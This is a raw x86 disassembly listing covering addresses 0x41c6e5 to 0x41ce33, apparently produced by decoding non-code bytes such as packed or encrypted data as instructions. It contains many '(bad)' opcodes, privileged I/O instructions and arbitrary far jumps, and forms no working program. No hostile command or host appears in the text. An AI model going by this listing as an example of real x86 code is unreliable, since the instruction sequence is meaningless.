  41c6e5:	lods   eax,DWORD PTR ds:[esi]
  41c6e6:	mov    ds:0x3f0a6949,eax
  41c6eb:	jecxz  0x41c6ea
  41c6ed:	aam    0xc3
  41c6ef:	leave  
  41c6f0:	jb     0x41c6f4
  41c6f2:	add    eax,0xb21e74b5
  41c6f7:	mov    ebx,0xe63be9f2
  41c6fc:	pop    esi
  41c6fd:	push   edx
  41c6fe:	fisttp DWORD PTR [eax-0x3793be67]
  41c704:	inc    ecx
  41c705:	scas   eax,DWORD PTR es:[edi]
  41c706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c707:	push   cs
  41c708:	mov    ecx,0x855a7e5a
  41c70d:	cdq    
  41c70e:	cmp    BYTE PTR [bp-0x377],al
  41c713:	inc    edx
  41c714:	cmp    al,0x22
  41c716:	cmp    al,0x3d
  41c718:	xchg   edi,eax
  41c719:	push   ebp
  41c71a:	cmp    ecx,DWORD PTR [edx-0x275c40a0]
  41c720:	mov    ds:0x2ce3c6d7,al
  41c725:	and    DWORD PTR [ecx-0x6],ebp
  41c728:	pop    edi
  41c729:	pushf  
  41c72a:	ds leave 
  41c72c:	jmp    0x9f151261
  41c731:	push   ebx
  41c732:	xor    esp,DWORD PTR [esi-0x12]
  41c735:	(bad)  
  41c737:	mov    bl,0xde
  41c739:	xor    al,0x44
  41c73b:	ss out dx,eax
  41c73d:	xchg   ebx,eax
  41c73e:	out    dx,eax
  41c73f:	push   edi
  41c740:	pusha  
  41c741:	inc    esp
  41c742:	retf   
  41c743:	es scas al,BYTE PTR es:[edi]
  41c745:	jae    0x41c799
  41c747:	lock mul DWORD PTR [edi+0x44619b1d]
  41c74e:	xor    ecx,ecx
  41c750:	mov    ebp,0x61de85ad
  41c755:	mov    ch,0x72
  41c757:	jl     0x41c709
  41c759:	add    eax,0x2ef1dc5b
  41c75e:	mov    sp,0x6644
  41c762:	fcomp  QWORD PTR [edi-0x5e]
  41c765:	mov    ecx,0xb4328e55
  41c76a:	retf   0x9ab7
  41c76d:	jmp    0x41c76d
  41c76f:	test   BYTE PTR [ebp+0x53],al
  41c772:	loopne 0x41c704
  41c774:	jbe    0x41c7ca
  41c776:	jns    0x41c70b
  41c778:	popa   
  41c779:	int3   
  41c77a:	in     al,dx
  41c77b:	xor    BYTE PTR [edx-0x59],0xdb
  41c77f:	pop    edi
  41c780:	jmp    0x6ed85b17
  41c785:	dec    edi
  41c786:	retf   
  41c787:	or     al,0xa5
  41c789:	(bad)  
  41c78a:	mov    al,0x22
  41c78c:	outs   dx,BYTE PTR ds:[esi]
  41c78d:	cmc    
  41c78e:	pop    eax
  41c78f:	inc    ecx
  41c790:	fdivr  DWORD PTR [ebx+0x22]
  41c793:	leave  
  41c794:	je     0x41c774
  41c796:	push   cs
  41c797:	call   0x314d6467
  41c79c:	jne    0x41c76b
  41c79e:	lods   al,BYTE PTR ds:[esi]
  41c7a0:	xor    eax,0x47b1aa4b
  41c7a5:	pushf  
  41c7a6:	loope  0x41c73b
  41c7a8:	sbb    eax,0x224aebb4
  41c7ad:	cmp    eax,0xe420cf06
  41c7b2:	jns    0x41c831
  41c7b4:	jmp    0x46c5:0xb348f4f6
  41c7bb:	pop    ss
  41c7bc:	dec    eax
  41c7bd:	mov    ebx,0x8c8c42e5
  41c7c2:	pop    ebp
  41c7c3:	push   cs
  41c7c4:	xchg   DWORD PTR [esi-0x55bb6c6],esi
  41c7ca:	rcl    BYTE PTR [bx],0x39
  41c7ce:	fdivr  DWORD PTR [edi-0x3f3d642]
  41c7d4:	lahf   
  41c7d5:	mov    ah,bh
  41c7d7:	sbb    esp,DWORD PTR [eax+0x7]
  41c7da:	into   
  41c7db:	mov    dh,0x86
  41c7dd:	adc    al,0x6c
  41c7df:	ficom  DWORD PTR [ecx]
  41c7e1:	dec    edx
  41c7e2:	push   edi
  41c7e3:	add    edi,DWORD PTR [ebx]
  41c7e5:	add    al,0x25
  41c7e7:	inc    edx
  41c7e8:	(bad)  
  41c7e9:	fcom   QWORD PTR [ebx+0x3d]
  41c7ec:	inc    edx
  41c7ed:	aad    0x81
  41c7ef:	mov    ch,0xa8
  41c7f1:	out    dx,al
  41c7f2:	das    
  41c7f3:	pop    edi
  41c7f4:	sbb    edi,eax
  41c7f6:	fsub   QWORD PTR [eax]
  41c7f8:	add    al,dl
  41c7fa:	xor    bl,dh
  41c7fc:	icebp  
  41c7fd:	lods   eax,DWORD PTR ds:[esi]
  41c7fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7ff:	arpl   WORD PTR [edi],di
  41c801:	aam    0x15
  41c803:	push   ds
  41c804:	jb     0x41c883
  41c806:	dec    ebp
  41c807:	push   edi
  41c808:	addr16 cdq 
  41c80a:	scas   al,BYTE PTR es:[edi]
  41c80b:	xor    al,0x74
  41c80d:	jns    0x41c7fa
  41c80f:	and    al,0x20
  41c811:	pop    edi
  41c812:	pop    edx
  41c813:	dec    edi
  41c814:	mov    ds:0x40c6bb63,eax
  41c819:	mov    al,ds:0x23202956
  41c81e:	sbb    DWORD PTR [edx],0xd
  41c821:	rcr    DWORD PTR [eax+0x2e],1
  41c824:	push   esi
  41c825:	and    al,0xe1
  41c827:	adc    BYTE PTR [edi],dl
  41c829:	pushf  
  41c82a:	fxch   st(7)
  41c82c:	mov    ecx,0x7680b58
  41c831:	call   0x46ee6cfc
  41c836:	pop    edx
  41c837:	std    
  41c838:	shl    DWORD PTR ds:0x2590,0xc6
  41c83e:	imul   BYTE PTR [edx+0x1aade188]
  41c844:	test   al,0x1a
  41c846:	jge    0x41c8ad
  41c848:	mov    ?,ebp
  41c84a:	rol    DWORD PTR [edx+eiz*2],0xcc
  41c84e:	adc    DWORD PTR [edx],0xffffffef
  41c851:	add    BYTE PTR [ebx+0x75],cl
  41c854:	push   eax
  41c855:	cmp    al,0xd5
  41c857:	addr16 jmp 0x6814:0x302c36f2
  41c85f:	call   0x7d6a:0x93e8c69b
  41c866:	push   edx
  41c867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c868:	xchg   ebx,eax
  41c869:	cmp    eax,DWORD PTR [ebp-0x3f2f2847]
  41c86f:	sub    al,0x88
  41c871:	adc    ch,BYTE PTR [esi-0x3b0f62a2]
  41c877:	add    eax,0x30aef30f
  41c87c:	sub    al,cl
  41c87e:	or     al,0x1b
  41c880:	add    DWORD PTR [ebp+0x319ab418],ebp
  41c886:	loopne 0x41c81a
  41c888:	push   0xfab2d0b5
  41c88d:	push   es
  41c88e:	lds    ecx,FWORD PTR [ebx+0x53fcd177]
  41c894:	test   BYTE PTR [eax+0x54fa5df3],bh
  41c89a:	push   0xaf90c027
  41c89f:	nop
  41c8a0:	daa    
  41c8a1:	adc    al,0xe7
  41c8a3:	adc    eax,0x3ebd1b31
  41c8a8:	xor    DWORD PTR [esi],ecx
  41c8aa:	rol    DWORD PTR [eax+0x6f],1
  41c8ad:	dec    edi
  41c8ae:	stc    
  41c8af:	test   DWORD PTR [esp+ebx*2+0x41],ecx
  41c8b3:	fbstp  TBYTE PTR [ebp+ebp*2-0x69]
  41c8b7:	cli    
  41c8b8:	fwait
  41c8b9:	cs cmp eax,0xea1be68b
  41c8bf:	or     BYTE PTR [ebx],dl
  41c8c1:	inc    ebx
  41c8c2:	dec    ebp
  41c8c3:	xor    BYTE PTR [edi],dl
  41c8c5:	neg    DWORD PTR [ebp+0x49]
  41c8c8:	fcomp  DWORD PTR [ecx+0xb]
  41c8cb:	mov    esp,0x85a00a88
  41c8d0:	icebp  
  41c8d1:	imul   eax,DWORD PTR [eax+ebp*2-0x6a],0xffffffbe
  41c8d6:	inc    eax
  41c8d7:	jb     0x41c8a9
  41c8d9:	pop    es
  41c8da:	(bad)  
  41c8db:	sub    ebx,DWORD PTR [ebp+0x2ccff905]
  41c8e1:	fs jg  0x41c899
  41c8e4:	push   esp
  41c8e5:	push   0xbb5fe16
  41c8ea:	sbb    al,0x9c
  41c8ec:	test   dl,cl
  41c8ee:	aas    
  41c8ef:	call   0x365173a0
  41c8f4:	xor    al,0x71
  41c8f6:	in     eax,dx
  41c8f7:	xchg   ecx,eax
  41c8f8:	jb     0x41c8da
  41c8fa:	and    esp,ebx
  41c8fc:	sbb    esi,edx
  41c8fe:	test   al,0x10
  41c900:	(bad)  
  41c901:	lods   al,BYTE PTR ds:[esi]
  41c902:	cmp    ah,al
  41c904:	(bad)  
  41c905:	fstp   QWORD PTR [esp+eiz*8+0x5f696ae4]
  41c90c:	mov    bl,0xb3
  41c90e:	dec    edi
  41c90f:	(bad)  
  41c910:	aam    0x9d
  41c912:	pop    es
  41c913:	mov    bl,0xa7
  41c915:	mov    ah,0x9a
  41c917:	sub    al,0x55
  41c919:	fst    DWORD PTR [edx+ebp*2]
  41c91c:	cli    
  41c91d:	mov    dl,0x76
  41c91f:	rol    BYTE PTR [eax+0x3d23afa3],cl
  41c925:	stos   DWORD PTR es:[edi],eax
  41c926:	and    BYTE PTR ds:0x12cf70a5,al
  41c92c:	pop    ds
  41c92d:	(bad)  
  41c92e:	cmp    al,0xc1
  41c930:	push   0x580f6c2e
  41c935:	pop    ecx
  41c936:	loop   0x41c938
  41c938:	int3   
  41c939:	outs   dx,DWORD PTR ds:[esi]
  41c93a:	and    al,0xc4
  41c93c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c93d:	aad    0xcf
  41c93f:	out    dx,eax
  41c940:	jb     0x41c8e1
  41c942:	xor    BYTE PTR [ebx-0x6880bcbc],dl
  41c948:	add    BYTE PTR [esi-0x27],0x4e
  41c94c:	sub    dh,BYTE PTR [ecx]
  41c94e:	and    bh,0x77
  41c951:	dec    edi
  41c952:	adc    ch,BYTE PTR [eax]
  41c954:	push   es
  41c955:	sbb    al,0xd4
  41c957:	jne    0x41c8e9
  41c959:	repnz mov ah,0xcf
  41c95c:	xchg   ebx,eax
  41c95d:	sbb    eax,0x1c7559e2
  41c962:	stc    
  41c963:	mov    ds:0xb12b99d1,eax
  41c968:	stos   DWORD PTR es:[edi],eax
  41c969:	xor    eax,0x66151c83
  41c96e:	sub    eax,0xe489ec3c
  41c973:	mov    eax,ds:0x1d7a219e
  41c978:	jg     0x41c93f
  41c97a:	push   esi
  41c97b:	mov    dl,0xfe
  41c97d:	dec    ebx
  41c97e:	dec    DWORD PTR [esi-0x10]
  41c981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c982:	adc    esp,edx
  41c984:	(bad)  
  41c985:	call   0x5a90:0x7230aab1
  41c98c:	dec    edi
  41c98d:	push   edx
  41c98e:	enter  0x6aac,0x16
  41c992:	fcomp  DWORD PTR [eax]
  41c994:	cli    
  41c995:	mov    bl,0xca
  41c997:	cli    
  41c998:	sbb    BYTE PTR [ebx+ecx*2+0x31e9892c],0x1c
  41c9a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a1:	push   ss
  41c9a2:	or     al,0x29
  41c9a4:	mov    ds:0x465e2a3e,al
  41c9a9:	adc    bl,al
  41c9ab:	in     eax,dx
  41c9ac:	cmp    DWORD PTR [esi+0x37],ecx
  41c9af:	push   0xffffff84
  41c9b1:	sar    edx,1
  41c9b3:	scas   eax,DWORD PTR es:[edi]
  41c9b4:	pop    ecx
  41c9b5:	test   BYTE PTR [edi+0x32cd0719],cl
  41c9bb:	add    DWORD PTR [edi-0x52dea66b],0x899730a6
  41c9c5:	xor    al,0x5b
  41c9c7:	test   BYTE PTR ds:0x40b9555e,bl
  41c9cd:	ret    
  41c9ce:	inc    bl
  41c9d0:	(bad)  
  41c9d1:	shr    DWORD PTR [ecx+0x5],1
  41c9d4:	scas   eax,DWORD PTR es:[edi]
  41c9d5:	or     dh,al
  41c9d7:	sbb    BYTE PTR [eax+0x30343fa4],bh
  41c9dd:	or     edi,DWORD PTR [esi+0x5f176883]
  41c9e3:	push   ebx
  41c9e4:	xchg   edx,eax
  41c9e5:	out    0xc1,eax
  41c9e7:	xor    esi,0x37
  41c9ea:	inc    esi
  41c9eb:	push   ebp
  41c9ec:	or     al,BYTE PTR [esi-0x36811ae9]
  41c9f2:	mov    ah,0xcf
  41c9f4:	xchg   esp,esp
  41c9f6:	inc    ebp
  41c9f7:	sub    edi,DWORD PTR [eax+0x5b]
  41c9fa:	les    ebp,FWORD PTR [edi]
  41c9fc:	mov    al,BYTE PTR [esi+0x1b]
  41c9ff:	fs push edx
  41ca01:	test   DWORD PTR [ecx],ecx
  41ca03:	and    edx,DWORD PTR [esi+0x5f31f466]
  41ca09:	leave  
  41ca0a:	cmp    BYTE PTR [edx+0x58],dh
  41ca0d:	xchg   ebp,eax
  41ca0e:	adc    dh,dl
  41ca10:	adc    DWORD PTR [ebp+ebp*8-0x42],edx
  41ca14:	jg     0x41ca0f
  41ca16:	std    
  41ca17:	(bad)  
  41ca18:	popf   
  41ca19:	les    eax,FWORD PTR [eax+0x5b5dccf0]
  41ca1f:	xor    DWORD PTR [ebp+0x2a29055f],0x6a
  41ca26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca27:	jbe    0x41ca5a
  41ca29:	test   eax,0xc42b47cc
  41ca2e:	mov    eax,ds:0x58ed682f
  41ca33:	ror    DWORD PTR [edi],1
  41ca35:	in     eax,0x47
  41ca37:	daa    
  41ca38:	(bad)  
  41ca39:	jnp    0x41ca53
  41ca3b:	arpl   WORD PTR ds:[eax-0x4e],bp
  41ca3f:	call   FWORD PTR [ecx+0x39]
  41ca42:	(bad)  
  41ca43:	sahf   
  41ca44:	scas   al,BYTE PTR es:[edi]
  41ca45:	mov    dl,0x77
  41ca47:	mov    esp,0x2ca40795
  41ca4c:	int3   
  41ca4d:	fistp  WORD PTR [ebp+0x1d11bc1c]
  41ca53:	(bad)  
  41ca54:	inc    esi
  41ca55:	push   0xfffffff0
  41ca57:	inc    ebp
  41ca58:	jns    0x41ca17
  41ca5a:	push   edx
  41ca5b:	mov    esp,0xdd85bc22
  41ca60:	sbb    ah,BYTE PTR [edi]
  41ca62:	pop    esi
  41ca63:	mov    al,0x94
  41ca65:	jmp    0x4a84:0x1edc8e0
  41ca6c:	xor    cl,bl
  41ca6e:	sbb    DWORD PTR [ebx],esi
  41ca70:	jo     0x41ca2b
  41ca72:	stos   BYTE PTR es:[edi],al
  41ca73:	xor    BYTE PTR [edi+0x4f],0xac
  41ca77:	inc    ebx
  41ca78:	cmp    DWORD PTR [edi+0x3f1fb5ca],edi
  41ca7e:	pop    ds
  41ca7f:	fild   DWORD PTR [edi-0x38]
  41ca82:	mov    bh,0x2d
  41ca84:	pop    DWORD PTR [esi-0x58]
  41ca87:	inc    edx
  41ca88:	sbb    eax,0xc75c5af4
  41ca8d:	stos   BYTE PTR es:[edi],al
  41ca8e:	retf   
  41ca8f:	ins    DWORD PTR es:[edi],dx
  41ca90:	rol    BYTE PTR [ebx+0xf5fb6ea],1
  41ca96:	pop    ecx
  41ca97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca98:	push   ds
  41ca99:	or     BYTE PTR [ecx-0x2f],cl
  41ca9c:	fst    QWORD PTR [ecx+0x68bc62f0]
  41caa2:	adc    al,dh
  41caa4:	gs push ebp
  41caa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caa7:	sub    al,0x13
  41caa9:	bound  ebp,QWORD PTR [edi+edi*4]
  41caac:	mov    dl,0x73
  41caae:	and    al,0x3a
  41cab0:	mov    edx,ebp
  41cab2:	cld    
  41cab3:	in     eax,dx
  41cab4:	nop
  41cab5:	cld    
  41cab6:	sti    
  41cab7:	es ret 
  41cab9:	or     al,0x13
  41cabb:	and    bl,bl
  41cabd:	(bad)  
  41cabe:	ror    BYTE PTR [ebx-0xa182c65],cl
  41cac4:	sbb    al,0xbb
  41cac6:	aam    0xeb
  41cac8:	test   BYTE PTR [esi],bl
  41caca:	sub    BYTE PTR [edi],cl
  41cacc:	loopne 0x41caf5
  41cace:	mov    eax,ds:0x7e47b0ef
  41cad3:	push   edi
  41cad4:	(bad)  
  41cad5:	push   ecx
  41cad6:	ds add eax,0xa28666db
  41cadc:	mul    DWORD PTR [ebp-0x59]
  41cadf:	fisub  WORD PTR [ebx]
  41cae1:	or     dh,BYTE PTR [esi-0x5ac0aedb]
  41cae7:	push   ebp
  41cae8:	popf   
  41cae9:	or     BYTE PTR [edx-0x34],dh
  41caec:	std    
  41caed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caee:	out    0x75,eax
  41caf0:	retf   0xc3f8
  41caf3:	pusha  
  41caf4:	inc    ecx
  41caf5:	loopne 0x41caf6
  41caf7:	inc    esi
  41caf8:	dec    ecx
  41caf9:	dec    ebp
  41cafa:	call   0x819a:0x17f89206
  41cb01:	nop
  41cb02:	pusha  
  41cb03:	mov    al,ds:0xf8016a74
  41cb08:	and    DWORD PTR [ecx-0x2bf5b8ff],esp
  41cb0e:	push   eax
  41cb0f:	fisub  DWORD PTR [eax+eax*2]
  41cb12:	push   ss
  41cb13:	add    bh,dl
  41cb15:	adc    eax,0x411ae4ff
  41cb1a:	jp     0x41caaa
  41cb1c:	dec    edx
  41cb1d:	mov    ds:0xdec9a7f5,eax
  41cb22:	xor    BYTE PTR [ebp-0x87aea5c],dl
  41cb28:	adc    al,al
  41cb2a:	xchg   ecx,eax
  41cb2b:	fsub   DWORD PTR [edi]
  41cb2d:	in     al,dx
  41cb2e:	and    WORD PTR ss:[edx+0x5a],0x55bb
  41cb35:	in     al,dx
  41cb36:	mov    al,ds:0x9f014b90
  41cb3b:	adc    bh,BYTE PTR [ebx-0x7b3e5324]
  41cb41:	push   eax
  41cb42:	lock jg 0x41cac9
  41cb45:	cmc    
  41cb46:	pusha  
  41cb47:	ins    DWORD PTR es:[edi],dx
  41cb48:	xchg   esi,eax
  41cb49:	cmp    bl,BYTE PTR [ebp+0x59]
  41cb4c:	mov    ecx,0xe6de9801
  41cb51:	add    DWORD PTR [ebx],esi
  41cb53:	fwait
  41cb54:	out    0x6e,al
  41cb56:	inc    eax
  41cb57:	fadd   QWORD PTR [edx]
  41cb59:	cdq    
  41cb5a:	cmp    edi,DWORD PTR [edx-0x67]
  41cb5d:	loope  0x41cafc
  41cb5f:	jns    0x41cb5a
  41cb61:	mov    ch,0x45
  41cb64:	icebp  
  41cb65:	cmp    ebx,DWORD PTR [edi]
  41cb67:	cli    
  41cb68:	je     0x41cbcd
  41cb6a:	sub    BYTE PTR [ecx-0x15],bh
  41cb6d:	add    BYTE PTR [edi+0x40f7de67],bl
  41cb73:	inc    ebx
  41cb74:	(bad)  
  41cb75:	mov    edx,0x36f97f5a
  41cb7a:	lea    esp,[eax+0x51961130]
  41cb80:	and    ecx,DWORD PTR [eax+esi*2+0x28]
  41cb84:	imul   esi,DWORD PTR [edx-0x6404cd64],0xffffffe7
  41cb8b:	aaa    
  41cb8c:	push   0xc4dca850
  41cb91:	push   ebx
  41cb92:	ror    DWORD PTR [eax],0x84
  41cb95:	xor    BYTE PTR [eax],bh
  41cb97:	jecxz  0x41cb58
  41cb99:	jle    0x41cba0
  41cb9b:	into   
  41cb9c:	mov    ah,0x53
  41cb9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb9f:	(bad)  
  41cba0:	jg     0x41cbc1
  41cba2:	push   cs
  41cba3:	mov    BYTE PTR [ebx],al
  41cba5:	arpl   WORD PTR [eax-0x3728fc60],bx
  41cbab:	imul   esi,DWORD PTR [eax-0x3e1dbce2],0x28
  41cbb2:	dec    edi
  41cbb3:	adc    eax,0x151afa71
  41cbb8:	rol    DWORD PTR ds:0xdfcf30d,0xca
  41cbbf:	call   0xd13844d8
  41cbc4:	scas   al,BYTE PTR es:[edi]
  41cbc5:	sbb    eax,edi
  41cbc7:	fmul   DWORD PTR [eax]
  41cbc9:	or     ecx,ebx
  41cbcb:	mov    al,ds:0x72655201
  41cbd0:	jb     0x41cb87
  41cbd2:	imul   ebp,DWORD PTR [esi+0x52],0x13612db1
  41cbd9:	mov    esp,0xe66f04a6
  41cbde:	ins    BYTE PTR es:[edi],dx
  41cbdf:	sar    DWORD PTR ds:0x8c714736,1
  41cbe5:	into   
  41cbe6:	push   DWORD PTR [ebx+0x4c]
  41cbe9:	push   esp
  41cbea:	mov    eax,0xe6e3c5ed
  41cbef:	push   ebp
  41cbf0:	das    
  41cbf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbf2:	out    0xc2,eax
  41cbf4:	and    ebx,DWORD PTR ds:0x8a003dd0
  41cbfa:	cdq    
  41cbfb:	pop    eax
  41cbfc:	mov    ebp,0xac2dd8a0
  41cc02:	jns    0x41cc7b
  41cc04:	add    cl,BYTE PTR [ecx]
  41cc06:	xchg   edx,eax
  41cc07:	fbld   TBYTE PTR [ebp+0x73]
  41cc0a:	xor    cl,cl
  41cc0c:	or     BYTE PTR [ecx],al
  41cc0e:	rol    BYTE PTR [eax-0xe],1
  41cc11:	jmp    0x41cb95
  41cc13:	adc    eax,0x6c0b031d
  41cc18:	push   0x11
  41cc1a:	pushf  
  41cc1b:	arpl   WORD PTR [edx+0x3dbbe85c],sp
  41cc21:	pop    edx
  41cc22:	and    esp,ecx
  41cc24:	push   ebp
  41cc25:	sub    DWORD PTR [ebp+0x31],edx
  41cc28:	sbb    BYTE PTR ds:[esi-0x5f70e4c9],al
  41cc2f:	mov    ah,0x5a
  41cc31:	sbb    BYTE PTR [edi-0x3bdeebf2],bh
  41cc37:	or     edi,DWORD PTR [edx]
  41cc39:	pop    eax
  41cc3a:	mov    edx,0x3ff81972
  41cc3f:	mov    WORD PTR [edx+0x24],cs
  41cc42:	jb     0x41cc8e
  41cc44:	mov    dl,0x43
  41cc46:	or     edi,DWORD PTR [edi-0x1f27c383]
  41cc4c:	aaa    
  41cc4d:	enter  0x67b8,0x81
  41cc51:	outs   dx,BYTE PTR ds:[esi]
  41cc52:	push   0x1c7c3ad0
  41cc57:	ret    
  41cc58:	push   esp
  41cc59:	int    0x70
  41cc5b:	jecxz  0x41cca9
  41cc5d:	retf   0x8d57
  41cc60:	add    al,0x95
  41cc62:	imul   esp,esp,0x9df25639
  41cc68:	retf   
  41cc69:	pop    es
  41cc6a:	or     al,cl
  41cc6c:	xchg   esi,eax
  41cc6d:	pop    esp
  41cc6e:	jns    0x41cc4f
  41cc70:	pop    ebx
  41cc71:	pop    edi
  41cc72:	scas   eax,DWORD PTR es:[edi]
  41cc73:	(bad)  
  41cc74:	es aaa 
  41cc76:	fs xor al,0xe0
  41cc79:	mov    edx,0xbd198f0a
  41cc7e:	shl    DWORD PTR cs:[ebp+0x4a7a8ead],0x7d
  41cc86:	adc    eax,0xcb943370
  41cc8b:	repz arpl sp,di
  41cc8e:	push   edi
  41cc8f:	jmp    0x35db0c3d
  41cc94:	jb     0x41ccdc
  41cc96:	fldlg2 
  41cc98:	add    eax,0x8f121c5a
  41cc9d:	sahf   
  41cc9e:	out    dx,eax
  41cc9f:	mov    ds:0xfaabe1b1,al
  41cca4:	ja     0x41cc8c
  41cca6:	loope  0x41ccaf
  41cca8:	xor    BYTE PTR [edi+0x3a189690],0x72
  41ccaf:	jle    0x41cc4b
  41ccb1:	cmc    
  41ccb2:	addr16 cmp bl,dl
  41ccb5:	pop    ss
  41ccb6:	pop    ebp
  41ccb7:	xchg   ecx,eax
  41ccb8:	pop    ds
  41ccb9:	call   0xd993e272
  41ccbe:	inc    ebp
  41ccbf:	pop    edx
  41ccc0:	in     eax,dx
  41ccc1:	inc    ecx
  41ccc2:	or     DWORD PTR [ecx-0x6e],0x7ab4beae
  41ccc9:	daa    
  41ccca:	mov    ecx,0x9e51cc9a
  41cccf:	hlt    
  41ccd0:	fist   DWORD PTR [ecx]
  41ccd2:	iret   
  41ccd3:	fisub  DWORD PTR gs:[edx]
  41ccd6:	push   0x605cb55
  41ccdb:	adc    BYTE PTR [ebp-0x1d],dl
  41ccde:	aaa    
  41ccdf:	out    dx,eax
  41cce0:	fs loop 0x41cd48
  41cce3:	push   esi
  41cce4:	adc    ah,BYTE PTR [esi+0x438de63b]
  41ccea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cceb:	imul   esp,ebp,0x40a285be
  41ccf1:	repnz add DWORD PTR [ecx-0x64ea712c],eax
  41ccf8:	test   al,0x6b
  41ccfa:	(bad)  
  41ccfb:	add    eax,DWORD PTR gs:[ecx-0x18ecad74]
  41cd02:	dec    edx
  41cd03:	dec    edx
  41cd04:	cmp    al,0xa0
  41cd06:	outs   dx,DWORD PTR ds:[esi]
  41cd07:	sar    BYTE PTR [ecx+esi*8-0x6dac8885],0xc8
  41cd0f:	test   al,0x72
  41cd11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd12:	sbb    DWORD PTR [esi-0x66],edx
  41cd15:	in     al,dx
  41cd16:	cmp    bh,BYTE PTR [eax]
  41cd18:	mov    al,ds:0x7a82f859
  41cd1d:	cdq    
  41cd1e:	jb     0x41ccc8
  41cd20:	sbb    BYTE PTR [edx],dl
  41cd22:	or     dh,BYTE PTR [ebx+0x6575fe6e]
  41cd28:	dec    ebx
  41cd29:	sbb    eax,0xddc9a68b
  41cd2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd2f:	mov    ah,0x14
  41cd31:	psubusw mm7,QWORD PTR [edi+eax*1-0x4c]
  41cd36:	jmp    0x41cd74
  41cd38:	inc    esi
  41cd39:	mov    esi,0x4b0a018f
  41cd3e:	jl     0x41ccdd
  41cd40:	push   ecx
  41cd41:	push   ecx
  41cd42:	hlt    
  41cd43:	sbb    edi,DWORD PTR [ebp+0x56]
  41cd46:	xchg   ebx,eax
  41cd47:	mov    bh,0x87
  41cd49:	jb     0x41cd6c
  41cd4b:	xor    esi,edx
  41cd4d:	sub    BYTE PTR [ecx],dl
  41cd4f:	inc    esp
  41cd50:	mov    al,0xb5
  41cd52:	xor    DWORD PTR [ecx],ebp
  41cd54:	outs   dx,DWORD PTR ds:[esi]
  41cd55:	mov    eax,gs:0x7b347e0d
  41cd5b:	or     al,0xbf
  41cd5d:	fcmovnu st,st(2)
  41cd5f:	jbe    0x41cd11
  41cd61:	ret    0x4e90
  41cd64:	les    esp,FWORD PTR [esi+0x58]
  41cd67:	test   BYTE PTR [ecx-0x2ac1e05],ah
  41cd6d:	out    0x9b,eax
  41cd6f:	cmp    al,0x93
  41cd71:	jecxz  0x41cd6b
  41cd73:	stos   BYTE PTR es:[edi],al
  41cd74:	add    eax,0x2584bfec
  41cd79:	jp     0x41cd1e
  41cd7b:	push   eax
  41cd7c:	jg     0x41cdcf
  41cd7e:	aad    0xab
  41cd80:	retf   0x46c9
  41cd83:	mov    bl,0xac
  41cd85:	or     edi,DWORD PTR [ecx-0x6f52a25a]
  41cd8b:	mov    ch,al
  41cd8d:	mov    eax,ds:0x89415cf5
  41cd92:	jg     0x41cd7f
  41cd94:	pop    ss
  41cd95:	inc    ecx
  41cd96:	cmp    eax,0xa73070fb
  41cd9b:	add    DWORD PTR [eax],edi
  41cd9d:	imul   edi,edx,0x90988e69
  41cda3:	sbb    DWORD PTR [edi+0x68],edi
  41cda6:	push   eax
  41cda7:	sbb    esi,DWORD PTR [ebx+0x379c3d3d]
  41cdad:	lds    edx,FWORD PTR [ecx]
  41cdaf:	aaa    
  41cdb0:	leave  
  41cdb1:	mov    bl,0xbb
  41cdb3:	sbb    bl,dl
  41cdb5:	pop    ss
  41cdb6:	(bad)  
  41cdb7:	into   
  41cdb8:	and    eax,0x3e833c96
  41cdbd:	jecxz  0x41cd72
  41cdbf:	pop    edx
  41cdc0:	outs   dx,DWORD PTR ds:[esi]
  41cdc1:	jg     0x41cddc
  41cdc3:	dec    edx
  41cdc4:	scas   al,BYTE PTR es:[edi]
  41cdc5:	mov    eax,ds:0x78290ec5
  41cdca:	or     eax,0x89d157aa
  41cdcf:	inc    edi
  41cdd0:	xor    eax,0xc7165cf5
  41cdd5:	rcl    BYTE PTR [edi+0x725aaf23],cl
  41cddb:	xchg   DWORD PTR [ebx+0x79],edx
  41cdde:	mov    BYTE PTR [edx],cl
  41cde0:	std    
  41cde1:	enter  0xb0d6,0xa9
  41cde5:	push   esi
  41cde6:	inc    ebx
  41cde7:	ret    
  41cde8:	loopne 0x41cd74
  41cdea:	dec    ebx
  41cdeb:	ret    
  41cdec:	into   
  41cded:	mov    esp,0xeabe0823
  41cdf2:	fisttp DWORD PTR [esi+0x6e]
  41cdf5:	push   edx
  41cdf6:	ja     0x41ce1f
  41cdf8:	push   ecx
  41cdf9:	jns    0x41cde0
  41cdfb:	adc    esi,ebp
  41cdfd:	ins    BYTE PTR es:[edi],dx
  41cdfe:	iret   
  41cdff:	loopne 0x41cdc7
  41ce01:	ss pop edx
  41ce03:	lods   al,BYTE PTR ds:[esi]
  41ce04:	imul   edi,DWORD PTR [edx-0x48],0xfffffff6
  41ce08:	(bad)  
  41ce0a:	out    0x4f,al
  41ce0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce0d:	jmp    0x8a1b:0x4f343012
  41ce14:	fwait
  41ce15:	ror    DWORD PTR [esi],cl
  41ce17:	and    ebp,DWORD PTR [ecx]
  41ce19:	mov    dl,0x3c
  41ce1b:	mov    ah,0xd2
  41ce1d:	imul   eax,DWORD PTR [edi+0x4d],0x8
  41ce21:	jno    0x41ce07
  41ce23:	pop    esp
  41ce24:	xchg   DWORD PTR [edx],ebx
  41ce26:	fs in  eax,0xfa
  41ce29:	inc    edi
  41ce2a:	inc    esi
  41ce2b:	push   es
  41ce2c:	dec    ebp
  41ce2d:	mov    ch,BYTE PTR [edi-0x72]
  41ce30:	icebp  
  41ce31:	sub    dl,dl
  41ce33:	fwait
